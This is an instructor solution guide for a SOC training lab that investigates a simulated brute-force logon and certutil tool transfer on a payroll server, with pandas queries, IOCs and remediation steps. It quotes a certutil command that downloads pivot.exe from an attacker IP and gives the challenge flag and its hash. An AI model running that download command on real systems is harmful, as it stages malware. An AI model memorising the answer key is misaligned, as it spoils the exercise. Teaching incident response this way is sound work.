# 🛡️ Instructor Solution Guide: Incident 0101 (Operation NightShift)

### Off-Hours Authentication Triage & Credential Stuffing Forensics

---

## 📌 Executive Summary

| Parameter                           | Details                                                                                               |
| :---------------------------------- | :---------------------------------------------------------------------------------------------------- |
| **Incident ID**                     | `INC-0101-NIGHTSHIFT`                                                                                 |
| **Target Host**                     | `PAYROLL-SRV01` (Windows Server 2022)                                                                 |
| **Threat Classification**           | TLP:AMBER \| Severity: **HIGH**                                                                       |
| **Primary MITRE ATT&CK Techniques** | **T1110.001** (Password Guessing), **T1078.002** (Domain Accounts), **T1105** (Ingress Tool Transfer) |
| **Compromised Account**             | `admin_finance`                                                                                       |
| **Breach Timestamp**                | `2026-09-10 03:14:22 UTC`                                                                             |
| **Attacker Source IP**              | `198.51.100.42`                                                                                       |
| **Recovered Incident Flag**         | `FLAG{brute_force_pivot_admin_2026}`                                                                  |

At 03:14 UTC on September 10, 2026, the Security Operations Center (SOC) detected a severe surge in failed authentication events targeting `PAYROLL-SRV01`, immediately followed by a successful interactive NTLM logon to the privileged domain account `admin_finance`. Within 45 seconds of initial access, the adversary utilized Windows Living-off-the-Land binary `certutil.exe` to stage an ingress tool transfer (`pivot.exe`) containing the containment flag.

---

## 🎯 Investigation Methodology: Step-by-Step

Follow these sequential steps in the interactive Marimo SIEM Console:

### Step 1: Alert Triage & Scope (Tab: `📋 Alert Triage & Scope`)

1. **Review the Executive Alert**: In the first tab, inspect the incident context and target host profile (`PAYROLL-SRV01`, Windows Server 2022).
2. **Review Top KPI Stat Cards**:
   - **Total Events Audited**: `1,073`
   - **Authentication Failures (Event ID 4625)**: `250`
   - **Successful Logons (Event ID 4624)**: `803`
   - **Distinct Source IPs**: `18`

---

### Step 2: Telemetry Exploration & Data Export (Tab: `🔍 Telemetry Explorer`)

1. **Filter by Logon Status**:
   - Change `Logon Status:` from `ALL` to `FAILURE`.
   - Observe that `Event ID 4625` records populate the table, indicating failed logon attempts against various administrative accounts.
2. **Filter by Target User**:
   - In `Target User:`, type `admin`.
   - Notice failures targeting `admin_backup`, `admin_db`, `admin_sys`, and `admin_finance`. This behavior matches automated password spraying or credential stuffing.
3. **Export Evidence**:
   - Click **📥 Export Filtered Telemetry (JSON)** to download the filtered dataset for external analysis.

---

### Step 3: Live Python Security Analytics (Tab: `💻 Analyst Python Scratchpad`)

Real SOC analysts routinely write Python and Pandas snippets to slice telemetry. In the **Analyst Python Scratchpad** tab:

1. **Execute Pre-Loaded Aggregation**:
   - The embedded code editor runs live Pandas code against `df`. The default query aggregates failures by source IP:
     ```python
     failures = df[df['status'] == 'FAILURE']
     top_failures = failures.groupby('source_ip').size().reset_index(name='fail_count')
     top_failures.sort_values(by='fail_count', ascending=False).head(10)
     ```
   - Notice that `198.51.100.42` immediately surfaces with 250 failures!
2. **Calculate the Compromise Time Delta**:
   - Enter the following snippet in the editor to calculate the exact duration between the last failed attempt and successful logon:
     ```python
     succ = df[(df['source_ip']=='198.51.100.42') & (df['status']=='SUCCESS')]['timestamp'].min()
     fail = df[(df['source_ip']=='198.51.100.42') & (df['status']=='FAILURE')]['timestamp'].max()
     f"Transition Delay: {succ - fail}"
     ```
   - Output shows the breach occurred within 19 seconds (`0 days 00:00:19`) of brute-force completion.

---

### Step 4: Attack Timeline & LOLBin Forensics (Tab: `⚡ Attack Timeline & Pivot`)

1. **Isolate Anomalous IP**:
   - Adjust the `Min Failed Logons Threshold` slider to `20` to filter out background noise.
   - Select `198.51.100.42` in the `Select Source IP to Trace Chronological Activity:` dropdown.
2. **Identify the Breach Point**:
   - Observe the prominent red alert:
     > 🚨 **BREACH CONFIRMED**: Source IP `198.51.100.42` achieved **1 successful logon(s)** after repeated failures!
     >
     > - **Compromised Account**: `admin_finance`
     > - **Breach Timestamp**: `2026-09-10 03:14:22 UTC`
     > - **Logon Event ID**: `4624` (Logon Success)
3. **Inspect Living-off-the-Land Tool Retrieval**:
   - Scroll to the bottom of the tab to review the captured process cards:
     - **Card 1 (`cmd.exe`)**: Reconnaissance (`whoami /all`).
     - **Card 2 (`certutil.exe`)**: Ingress Tool Transfer (MITRE T1105):
       ```bat
       certutil -urlcache -split -f http://198.51.100.42/pivot.exe FLAG{brute_force_pivot_admin_2026}
       ```
   - The flag was passed as an embedded tracking argument in the command line: `FLAG{brute_force_pivot_admin_2026}`.

---

### Step 5: Flag Verification & Submission (Tab: `🏁 Case Verification & IOCs`)

1. **Verify the Flag in the Notebook**:
   - In **Step 5: Verify Incident Flag & IOC Report**, paste `FLAG{brute_force_pivot_admin_2026}` into the text box.
   - The workbench validates the candidate flag using one-way cryptographic SHA-256 verification (`3422238b011b622ac8dfe184eef91461c0dd7728771aa7e343915790c26e87a8`), ensuring no plaintext answers can be inspected in the notebook code.
   - Confirm the green verification card: `🎉 FLAG VERIFIED CORRECT!`.
   - Upon correct verification, the confirmed **Threat Intelligence Indicators of Compromise (IOCs)** report unlocks below the input.
2. **Submit to Portal**:
   - Copy `FLAG{brute_force_pivot_admin_2026}` into the CyberLab challenge submission pane in the left portal to claim your 100 points and register your SOC competency.

---

## 🐍 Standalone Python Forensics Script

To reproduce this investigation programmatically outside of Marimo:

```python
import json
from pathlib import Path
import pandas as pd

# Load dataset
data_path = Path("data/auth_events.json")
with open(data_path) as f:
    events = json.load(f)

df = pd.DataFrame(events)
df["timestamp"] = pd.to_datetime(df["timestamp"])

# 1. Identify top failure source IP
failures = df[df["status"] == "FAILURE"]
top_attacker_ip = failures["source_ip"].value_counts().index[0]
print(f"[+] Top Malicious IP: {top_attacker_ip} ({failures['source_ip'].value_counts().iloc[0]} failures)")

# 2. Check for successful logins from attacker IP
attacker_success = df[(df["source_ip"] == top_attacker_ip) & (df["status"] == "SUCCESS")]
for _, row in attacker_success.iterrows():
    print(f"[!] Breach Confirmed: User '{row['target_user']}' breached at {row['timestamp']}")

# 3. Extract suspicious commands executed
cmd_events = df[(df["source_ip"] == top_attacker_ip) & (df["command_line"].notna())]
for _, row in cmd_events.iterrows():
    print(f"[>] Executed: {row['process_name']} -> {row['command_line']}")
```

---

## 📋 Indicators of Compromise (IOCs)

| Indicator Type          | Value                              | Context                                            |
| :---------------------- | :--------------------------------- | :------------------------------------------------- |
| **Attacker IPv4**       | `198.51.100.42`                    | External source of brute-force and C2 staging      |
| **Compromised Account** | `admin_finance`                    | Domain administrative credential breached via NTLM |
| **Attacker Binary URL** | `http://198.51.100.42/pivot.exe`   | Second-stage lateral movement payload              |
| **LOLBin Invocation**   | `certutil.exe -urlcache -split -f` | Ingress tool transfer mechanism                    |
| **Breach Timestamp**    | `2026-09-10 03:14:22 UTC`          | Initial interactive logon                          |

---

## 🛡️ Remediation & Incident Response Playbook

1. **Immediate Host Containment**:
   - Isolate `PAYROLL-SRV01` from the corporate network to prevent lateral movement.
2. **Account Revocation & Invalidation**:
   - Force reset password for `admin_finance` and invalidate all active Kerberos TGT tickets and NTLM sessions (`Revoke-AzureADUserAllRefreshToken` / Active Directory session reset).
3. **Firewall Blocking**:
   - Place `198.51.100.42` onto edge perimeter firewall droplists.
4. **Artifact Cleanup**:
   - Delete any downloaded artifacts (`pivot.exe`) from `C:\Windows\System32\` and clear the certutil cache:
     ```cmd
     certutil -urlcache * delete
     ```
5. **Hardening**:
   - Enforce Multi-Factor Authentication (MFA) on all interactive and remote administrative logons.
   - Implement Account Lockout thresholds (e.g., 5 failed attempts locks account for 30 minutes) to mitigate automated password spraying.
